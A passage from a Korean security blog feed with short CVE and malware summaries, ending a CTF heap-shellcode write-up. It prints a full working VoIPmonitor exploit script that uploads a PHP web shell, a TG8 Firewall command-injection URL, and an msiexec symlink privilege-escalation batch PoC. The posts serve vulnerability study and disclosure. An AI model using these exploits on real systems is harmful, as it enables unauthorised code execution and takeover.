[rsp + 0x20], 0</span><span class="hljs-string">lea r9, [rsp + 0x200]</span><span class="hljs-string">mov r8, 0x100</span><span class="hljs-string">lea rdx, [rsp + 0x100]</span><span class="hljs-string">mov rcx, <span class="hljs-subst">&#123;stdout&#125;</span></span><span class="hljs-string">mov rax, <span class="hljs-subst">&#123;writefile&#125;</span></span><span class="hljs-string">call rax</span><span class="hljs-string">loop:</span><span class="hljs-string">jmp loop</span><span class="hljs-string">readflag:</span><span class="hljs-string">call flag</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>shellcode = (asm(shellcode) + <span class="hljs-string">&quot;flag.txt\x00&quot;</span>).ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&quot;\x90&quot;</span>)p.send(shellcode)p.interactive()</code></pre><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%207.png" alt="pwncoolsexy-part5/Untitled%207.png"></p><p>험난했다… </p><h1 id="마무리"><a href="#마무리" class="headerlink" title="마무리"></a>마무리</h1><p>드디어 폰쿨섹시 시리즈 마지막 글까지 모두 끝났습니다 짞짝ㅉㅏㄱ !  </p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%201.png" alt="pwncoolsexy-part5/Untitled%201.png"></p><p>오랜만에 Part 1 글을 보면서 시리즈 목표를 다시 봤는데.. 원래 계획에 딱 맞게 Part 5로 마무리됐네요. 사실 거의 무계획이나 다름없었는데 다행이다 휴ㅎ; </p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%202.png" alt="pwncoolsexy-part5/Untitled%202.png"></p><p>약 3개월간 진행한 정든 시리즈를 떠나보내며.. 이 글이 윈도우를 처음 시작하시는 분들께 많은 도움이 되었으면 좋겠습니다. 이제 다음은 뭘 할지 고민해야 하는데 아 뭐하지 ㅁㄴㅇㄹ </p><p>그럼 한동안은 그동안 봐 두었던 번역글과 하루한줄로 돌아오겠습니다! </p><ul><li>모든 시리즈 글의 오류 및 오타 지적은 언제나 환영입니다</li></ul><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%203.png" alt="pwncoolsexy-part5/Untitled%203.png"></p><blockquote><p>진짜 끝!</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>heap</tag>
      
      <tag>ctf</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>lfh</tag>
      
      <tag>nt heap</tag>
      
      <tag>hitcon</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-30461: VoIPmonitor RCE</title>
    <link href="/2021/05/08/fabu1ous/2021-05-08/"/>
    <url>/2021/05/08/fabu1ous/2021-05-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-voipmonitor-unauth-rce/">VoIPmonitor UnAuth RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>VoIPmonitor &lt;= 24.60</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>오픈소스 network packet sniffer인 VoIPmonitor에서 RCE취약점이 발견되었습니다. 해당 취약점은 <code>SPOOLDIR</code> 혹은 <code>recheck</code> 파라미터를 사용하는 POST 요청을 처리할 때 발생합니다. <code>SPOOLDIR</code> 파라미터 값은 UI 인터페이스가 호출하는 <code>config/configuration.php</code>에 아무런 필터나 가공 없이 있는 그대로 삽입됩니다. 이는 인증되지 않은 사용자라도 웹 인터페이스를 통해 임의의 PHP 코드를 원격으로 실행할 수 있게 해  줍니다. </p><pre><code class="hljs python"><span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv,exit<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> random<span class="hljs-keyword">import</span> string<span class="hljs-keyword">try</span>:    <span class="hljs-keyword">import</span> requests<span class="hljs-keyword">except</span> ImportError:    print(<span class="hljs-string">&quot;pip3 install requests &quot;</span>)print(<span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">###############################################</span><span class="hljs-string">#              VOIP Monitor RCE               #</span><span class="hljs-string">###############################################</span><span class="hljs-string">&quot;&quot;&quot;</span>)headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>&#125;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_target</span>(<span class="hljs-params">args</span>):</span>    hostname = args.host    path = args.path    <span class="hljs-keyword">if</span> path:        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;hostname&#125;</span>/<span class="hljs-subst">&#123;path&#125;</span>/index.php&quot;</span>    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;hostname&#125;</span>/index.php&quot;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_tmp</span>(<span class="hljs-params">args</span>):</span>    <span class="hljs-keyword">global</span> headers    target = get_target(args)    n_data = &#123;<span class="hljs-string">&quot;SPOOLDIR&quot;</span>: <span class="hljs-string">&quot;/tmp&quot;</span>, <span class="hljs-string">&quot;recheck&quot;</span>: <span class="hljs-string">&quot;annen&quot;</span>&#125;    set_totmp = requests.post(target, n_data, headers=headers)    print(<span class="hljs-string">f&quot;[*] set /tmp <span class="hljs-subst">&#123;set_totmp&#125;</span>&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkVulnerability</span>(<span class="hljs-params">args</span>):</span>    <span class="hljs-keyword">global</span> headers    target = get_target(args)    print(<span class="hljs-string">f&quot;[+] Attacking <span class="hljs-subst">&#123;target&#125;</span>&quot;</span>)    testcmd = &#123;<span class="hljs-string">&quot;SPOOLDIR&quot;</span>: <span class="hljs-string">&quot;test\&quot;.system(id).\&quot;&quot;</span>, <span class="hljs-string">&quot;recheck&quot;</span>: <span class="hljs-string">&quot;annen&quot;</span>&#125;    response_text = <span class="hljs-string">b&quot;uid=&quot;</span>    testcmd_req = requests.post(target, testcmd, verify=<span class="hljs-literal">False</span>, headers=headers)    <span class="hljs-keyword">if</span> response_text <span class="hljs-keyword">in</span> testcmd_req.content:        print(<span class="hljs-string">&quot;[*] host is vulnerable&quot;</span>)    <span class="hljs-keyword">else</span>:        print(<span class="hljs-string">&quot;[-] host is not vulnerable&quot;</span>)        exit()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">uploadshell</span>(<span class="hljs-params">args</span>):</span>    <span class="hljs-keyword">global</span> headers    hostname = args.host    path = args.path    shell_path = <span class="hljs-string">&quot;&quot;</span>    shellfilename = str ( <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(string.ascii_lowercase) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>)) )    target = get_target(args)    rce_payload = &#123;<span class="hljs-string">&quot;SPOOLDIR&quot;</span>: <span class="hljs-string">f&quot;/tmp\&quot;.file_put_contents(&#x27;<span class="hljs-subst">&#123;shellfilename&#125;</span>.php&#x27;,&#x27;&lt;?php echo system($_GET[\&quot;a\&quot;]);&#x27;).\&quot;&quot;</span>, <span class="hljs-string">&quot;recheck&quot;</span>: <span class="hljs-string">&quot;annen&quot;</span>&#125;    rce_req = requests.post(target, headers=headers, data=rce_payload)    print(<span class="hljs-string">f&quot;[*] uploading shell <span class="hljs-subst">&#123;rce_req.status_code&#125;</span>&quot;</span>)    <span class="hljs-keyword">if</span> path:        shell_path = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;hostname&#125;</span>/<span class="hljs-subst">&#123;path&#125;</span>/<span class="hljs-subst">&#123;shellfilename&#125;</span>.php&quot;</span>    <span class="hljs-keyword">else</span>:        shell_path = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;hostname&#125;</span>/<span class="hljs-subst">&#123;shellfilename&#125;</span>.php&quot;</span>    shell_check = requests.get(shell_path, headers=headers, params=&#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;id&#x27;</span>&#125;)    print(<span class="hljs-string">f&quot;[*] RCE Check : <span class="hljs-subst">&#123;shell_check.text&#125;</span>&quot;</span>)    print(<span class="hljs-string">f&quot;[*] Your Shell at <span class="hljs-subst">&#123;shell_path&#125;</span>&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;VoIP Monitor all versions command execution&#x27;</span>)    parser.add_argument(<span class="hljs-string">&#x27;-t&#x27;</span>,<span class="hljs-string">&#x27;--host&#x27;</span>,help=<span class="hljs-string">&#x27;Host&#x27;</span>, type=str)    parser.add_argument(<span class="hljs-string">&#x27;-b&#x27;</span>, <span class="hljs-string">&#x27;--path&#x27;</span>,help=<span class="hljs-string">&#x27;Path of the VoIP Monitor&#x27;</span>, type=str)    args = parser.parse_args()    set_tmp(args)    checkVulnerability(args)    set_tmp(args)    uploadshell(args)    set_tmp(args)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    main()</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21551: 수억 대의 Dell PC에 영향을 주는 권한 상승 취약점</title>
    <link href="/2021/05/07/l0ch/2021-05-07/"/>
    <url>/2021/05/07/l0ch/2021-05-07/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/">CVE-2021-21551- Hundreds Of Millions Of Dell Computers At Risk Due to Multiple BIOS Driver Privilege Escalation Flaws</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Dell Windows device</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2009년부터 Dell이 출시한 수억 대의 Windows 디바이스에 영향을 주는 권한 상승 취약점의 세부 정보가 공개되었습니다.</p><p>취약점이 존재하는 드라이버 <code>dbutil_2_3.sys</code>는 Dell BIOS 유틸리티를 통한 펌웨어 업데이트에 사용되는 드라이버로 2009년부터 Dell의 대부분의 Windows 디바이스에 포함되어 정기적인 업데이트에 사용됩니다.</p><p>해당 드라이버에는 다섯 개의 권한 상승 취약점이 발견되었으며 단일 CVE가 할당되었습니다.  첫 번째 취약점은 <a href="https://ko.wikipedia.org/wiki/%EC%A0%91%EA%B7%BC_%EC%A0%9C%EC%96%B4_%EB%AA%A9%EB%A1%9D">ACL(Access Control List)</a> 구성 미흡으로 드라이버가 권한 없는 사용자의 IOCTL 요청을 수행할 수 있어 발생합니다. 따라서 권한 없는 사용자가 IOCTL <code>0x9B0C1EC8</code> 로 <code>memmove</code> 함수에 전달되는 인수를 제어할 수 있어 arbitrary memory read/write가 가능합니다. 해커는 이를 악용해 <code>EPROCESS</code>의 토큰 권한 멤버인 <code>Present</code> 및 <code>Enabled</code>을 덮어쓰는 것으로 로컬 권한 상승을 트리거할 수 있습니다.</p><p>취약점을 제보한 SentinelLabs는 첫 번째를 제외한 나머지 권한 상승 취약점의 세부 정보 및 PoC는 2021년 6월 1일까지 공개를 보류하겠다고 밝혔습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>lpe</tag>
      
      <tag>arbitrary read</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary write</tag>
      
      <tag>dell</tag>
      
      <tag>kernel driver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] ICMP 터널링을 사용한 백도어 Pingback</title>
    <link href="/2021/05/06/idioth/2021-05-06/"/>
    <url>/2021/05/06/idioth/2021-05-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel/">Pingback: Backdoor At The End Of The ICMP Tunnel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ICMP 터널링을 사용하여 통신 탐지를 우회한 뒤 감염된 PC에서 지속적으로 임의 명령을 수행하는 백도어가 발견되었습니다.</p><p>해당 악성코드는 데이터베이스, 메시지 큐 및 파일 시스템과 같은 여러 리소스 관리자에 걸쳐있는 트랜잭션을 조정하는 <a href="https://en.wikipedia.org/wiki/Microsoft_Distributed_Transaction_Coordinator">msdtc</a>(Microsoft Distributed Transaction Coordinator)를 통해 악성 DLL <code>oci.dll</code>을 호출하여 지속성을 유지합니다. 또한 msdtc를 시작 프로그램으로 설정하기 위해 SYSTEM 권한을 필요로 하며 멀웨어를 설치할 때 <a href="https://docs.microsoft.com/ko-kr/windows-server/administration/windows-commands/sc-config">SC Command</a>를 사용하여 윈도우 시스템 디렉터리에 <code>oci.dll</code>를 설치하고 msdtc를 시작 프로그램으로 등록합니다.</p><p><code>oci.dll</code>은 통신에 <a href="https://ko.wikipedia.org/wiki/%EC%9D%B8%ED%84%B0%EB%84%B7_%EC%A0%9C%EC%96%B4_%EB%A9%94%EC%8B%9C%EC%A7%80_%ED%94%84%EB%A1%9C%ED%86%A0%EC%BD%9C">ICMP(Internet Control Message Protocol)</a>을 사용합니다. ICMP는 네트워크 계층 프로토콜로 ICMP 패킷과 연계되는 TCP, UDP 포트 번호가 존재하지 않아 <code>netstat</code>에서 통신을 숨길 수 있습니다.</p><p>ICMP 프로토콜을 통해 통신을 하기 위해 <a href="https://en.wikipedia.org/wiki/ICMP_tunnel">ICMP 터널링</a>을 사용합니다. IPv4 네트워크에서 ICMP 패킷은 IPv4 헤더, ICMP 헤더, ICMP 데이터로 구성되어 있습니다. Type 8 (Echo, ping) ICMP 메시지를 전송하여 명령을 수행하며 패킷 데이터 형식은 다음과 같습니다.</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ICMPData</span> &#123;</span><span class="hljs-keyword">char</span> cmd[<span class="hljs-number">10</span>];    <span class="hljs-comment">// bot command</span><span class="hljs-keyword">char</span> args[<span class="hljs-number">512</span>];  <span class="hljs-comment">// extra parameter</span><span class="hljs-keyword">char</span> cmd_line[<span class="hljs-number">258</span>];  <span class="hljs-comment">// command line</span><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> dest_port; <span class="hljs-comment">// destination port</span><span class="hljs-keyword">char</span> dest_addr[<span class="hljs-number">4</span>];  <span class="hljs-comment">// destination IP address</span>&#125;</code></pre><p>Pingback에서 지원하는 명령어는 다음과 같습니다.</p><ul><li><strong>shell</strong> - 쉘 실행</li><li><strong>download</strong> - 3개의 모드가 존재<ul><li>Mode 1: 해커의 호스트에 감염된 PC를 다시 연결</li><li>Mode 2: 감염된 PC가 지정된 포트에 소켓을 열고 해커의 연결을 기다림</li><li>Mode 3: ICMP 기반으로 매우 느리고 현재 구현 상 flow control을 신뢰할 수 없음</li></ul></li><li><strong>upload</strong> - 다운로드 명령과 비슷하게 3개의 모드를 지원함</li><li><strong>exec</strong> - 감염된 PC에서 명령어를 실행함</li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>icmp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Android OOB write in NFC stack</title>
    <link href="/2021/05/05/fabu1ous/2021-05-05/"/>
    <url>/2021/05/05/fabu1ous/2021-05-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2144">OOB Write in NFC stack when handling MIFARE Classic TLVs</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Android-10</p><p>Android-11</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>악성 NFC 패킷을 통한 안드로이드 RCE 취약점이 발견되었습니다. 안드로이드 NFC는 함수<code>rw_mfc_handle_read_op()</code>를 사용해  블록 단위 요청을 보내고 MFC(MIFARE Classic) 카드로부터 NDEF(NFC Data Exchange Format)를 받아옵니다. 함수 <code>rw_mfc_handle_read_op()</code> 는 STATE에 따라 다음과 같이 동작합니다.</p><ol><li><p>RW_MFC_STATE_DETECT_TLV</p><p>블록의 TLV를 파싱해  <code>p_mfc-&gt;ndef_length</code>값을 저장하고 그에 맞는 버퍼를 할당합니다.</p></li><li><p>RW_MFC_STATE_READ_NDEF</p><p>블록의 TLV를 다시 디코딩해 <code>p_mfc-&gt;ndef_length</code>값을 업데이트한 뒤 버퍼에 데이터를 복사합니다.</p></li></ol><p>악성 NFC 패킷을 통해 두 STATE에서 서로 다른 <code>p_mfc-&gt;ndef_length</code>값을 사용하도록 유도할 수 있습니다. 따라서 buffer overflow가 발생할 수 있으며 이를 악용해 원격 코드 실행 공격을 할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>rce</tag>
      
      <tag>nfc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] TG8 Firewall의 PreAuth 원격 코드실행 취약점</title>
    <link href="/2021/05/04/l0ch/2021-05-04/"/>
    <url>/2021/05/04/l0ch/2021-05-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-tg8-firewall-preauth-rce-and-password-disclosure/">SSD Advisory – TG8 Firewall PreAuth RCE and Password Disclosure</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>TG8 Firewall</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><a href="http://www.tg8security.com/firewall.html">TG8 Security</a> 사의 방화벽에서 인증되지 않은 root 권한의 원격 코드 실행 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p>취약점은 인증 요청을 처리하는 <code>index.php</code> 에 존재하며 아래와 같습니다.</p><pre><code class="hljs php">...  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkLogin</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">var</span> username = $(<span class="hljs-string">&#x27;input[name=u]&#x27;</span>).val();    <span class="hljs-keyword">var</span> pass = $(<span class="hljs-string">&#x27;input[name=p]&#x27;</span>).val();    <span class="hljs-keyword">var</span> cmd = <span class="hljs-string">&#x27;sudo /home/TG8/v3/syscmd/check_gui_login.sh &#x27;</span> + username + <span class="hljs-string">&#x27; &#x27;</span> + pass;    $.ajax(&#123;      url: <span class="hljs-string">&quot;runphpcmd.php&quot;</span>,      type: <span class="hljs-string">&quot;post&quot;</span>,      dataType: <span class="hljs-string">&quot;json&quot;</span>,      cache: <span class="hljs-string">&quot;false&quot;</span>,      data: &#123;        syscmd: cmd      &#125;,      success: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">x</span>) </span>&#123;        <span class="hljs-keyword">if</span> (x == <span class="hljs-string">&#x27;OK&#x27;</span>) &#123;          ok(username);        &#125; <span class="hljs-keyword">else</span> &#123;          failed();        &#125;      &#125;,      <span class="hljs-built_in">error</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;      ok(username);        <span class="hljs-comment">// alert(&quot;failure to excute the command&quot;);</span>      &#125;    &#125;)  &#125;...</code></pre><p>인증 요청을 받으면 로그인을 처리하는 <code>check_gui_login.sh</code> 에 <code>username</code>과 <code>pass</code>를 매개변수로 명령을 구성합니다. 이는 <code>runphpcmd.php</code> 의 <code>syscmd</code>로 전달되고 root 권한으로 <code>check_gui_login.sh</code>가 실행됩니다. 그러나  <code>syscmd</code>에 대한 어떠한 검사도 존재하지 않아 해커가 임의의 코드를 포함한 <code>syscmd</code>를 매개변수로 <code>runphpcmd.php</code>에 직접 요청하면 원격 코드 실행이 트리거 됩니다. </p><p>root 권한으로 <code>ls</code> 명령어를 실행하는 PoC는 다음과 같습니다.</p><pre><code class="hljs c">http:<span class="hljs-comment">//&lt;server&gt;/admin/runphpcmd.php?syscmd=sudo+%2Fhome%2FTG8%2Fv3%2Fsyscmd%2Fcheck_gui_login.sh+%3Bls%3B++local</span></code></pre><p>제보자는 해당 취약점 외에도 액세스 권한 설정 미흡으로 인해 인증되지 않은 사용자가 <code>/data/</code> 디렉터리의 자격 증명 파일에 접근할 수 있는 정보유출 취약점 또한 발견했습니다.</p><p>이를 해당 방화벽 장비의 공급 업체인 TG8에게 SNS 및 이메일을 통해 여러 차례 제보하였으나 공급 업체로부터 어떠한 응답도 받지 못했다고 밝혔으며, 해당 장비를 사용하고 있다면 즉시 외부 인터넷으로 통하는 포트를 차단할 것을 강력하게 권고했습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>pre-auth</tag>
      
      <tag>L0ch</tag>
      
      <tag>firewall</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-26415: Microsoft Installer Local Privilege Escalation</title>
    <link href="/2021/05/03/idioth/2021-05-03/"/>
    <url>/2021/05/03/idioth/2021-05-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.cloaked.pl/2021/04/cve-2021-26415/">CVE-2021-26415</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Windows Installer</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Windows Installer(MSI)에서 TOCTOU와 symlink를 통한 Local Privilege Escalation 취약점이 발견되었습니다. <code>msiexec</code>는 기본적으로 관리자 권한을 필요로 하지만 repair operation 수행을 위해 <code>/f</code> 옵션을 사용하면 권한이 없이 사용할 수 있습니다. <code>/L</code> 옵션과 함께 사용하면 로그 파일을 지정된 곳에 생성할 수 있습니다.</p><pre><code class="hljs taggerscript">msiexec /f C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\I</span>nstaller<span class="hljs-symbol">\1</span>48d3c4.msi /L C:<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\f</span>oo.log</code></pre><p>symlink를 통해 <code>foo.log</code>가 첫 CreatFile에서 시스템 권한으로 impersnation 될 때 oplock을 설치하면 다음 쓰기/읽기 작업은 심볼릭 링크된 파일에서 수행됩니다. PowerShell을 Overwrite하여 LPE를 하는 POC는 다음과 같습니다.</p><pre><code class="hljs latex">@echo offREM Put BaitAndSwitch, example.msi into C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span>echo &gt; C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">fakelog</span></span>.txtstart C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">BaitAndSwitch</span></span> C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">linkdir</span></span><span class="hljs-tag">\<span class="hljs-name">link</span></span> C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">fakelog</span></span>.txt C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">System</span></span>32<span class="hljs-tag">\<span class="hljs-name">WindowsPowerShell</span></span><span class="hljs-tag">\<span class="hljs-name">v</span></span>1.0<span class="hljs-tag">\<span class="hljs-name">profile</span></span>.ps1timeout /t 1msiexec /j C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">example</span></span>.msi /t ksz /Li! C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">linkdir</span></span><span class="hljs-tag">\<span class="hljs-name">link</span></span> /qn</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>toctou</tag>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>msi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Two CVEs in Parallels Desktop RDPMC</title>
    <link href="/2021/05/01/fabu1ous/2021-05-01/"/>
    <url>/2021/05/01/fabu1ous/2021-05-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/4/26/parallels-desktop-rdpmc-hypercall-interface-and-vulnerabilities">PARALLELS DESKTOP RDPMC HYPERCALL INTERFACE AND VULN</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Parallels Desktop 15.1.5 (Guest)</p><p>macOS Caltalina 10.15.7 (Host)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Parallels Desktop에서 hypercall 인터페이스를 통해 Guest 유저가 Host 커널에서 임의 코드를 실행할 수 있는 취약점이 발견되었습니다. Parallels Desktop은 RDPMC(Read Performance-Monitor Counter) instruction을 사용하는 hypercall 인터페이스를 통해 guest와 host의 통신을 지원합니다. 해당 인터페이스는 guest 유저 권한으로도 접근할 수 있기 때문에 host VMM(Virtual Machine Monitor)의 취약점을 트리거해 권한 상승이 가능합니다.</p><ul><li><p>CVE-2021-31424 : Heap overflow</p><p>host VMM은 guest와 데이터를 주고받을 때 <code>ReadLinear()</code>와 <code>WriteLinear()</code>를 사용합니다. guest 유저가 제어할 수 있는 데이터(UEFI variable name)에 대한 길이 검증 미흡으로 인해 해당 데이터를 복사하는 과정에서 Heap overflow가 발생합니다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">uint64_t</span> <span class="hljs-title">OTGHandleGenericCommand</span><span class="hljs-params">(<span class="hljs-keyword">uint64_t</span> x)</span> </span><span class="hljs-function"></span>&#123;           <span class="hljs-comment">/* case 9 */</span>         MonReadLinear(regs.rsi, &amp;request, <span class="hljs-number">0x30</span>);          SharedMem-&gt;EFIVar.op = request.op;          ReadLinear(request.name, SharedMem-&gt;EFIVar.name, <span class="hljs-number">2</span> * request.size);        <span class="hljs-comment">// heap overflow when copying variable name from guest </span>        SharedMem-&gt;EFIVar.name[request.size] = <span class="hljs-number">0</span>;        ...</code></pre></li></ul><ul><li><p>CVE-2021-31427 : TOCTOU</p><p>guest에 보내야 할 데이터의 크기 값(<code>EFIVar.datasize</code>) 검증은 user space에서 이루어집니다. VMM과 userspace 사이 컨트롤 위임을 담당하는 함수 <code>MonRetToHostSwitch()</code>와 공유 메모리로부터  <code>EFIVar.datasize</code>를 복사해오는 함수 <code>WriteLinear()</code> 사이에서 race condition이 발생합니다. 데이터 길이 검증과 데이터 복사 작업 사이에 <code>EFIVar.datasize</code>값을 번경하는 것이 가능하므로 host kernel 데이터에 대한 OOB(out-of-bound) read로 이어질 수 있습니다.  </p></li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>race condition</tag>
      
      <tag>mac</tag>
      
      <tag>heap overflow</tag>
      
      <tag>parallels</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-25319: VirtualBox의 권한상승 취약점</title>
    <link href="/2021/04/30/l0ch/2021-04-30/"/>
    <url>/2021/04/30/l0ch/2021-04-30/</url>
    
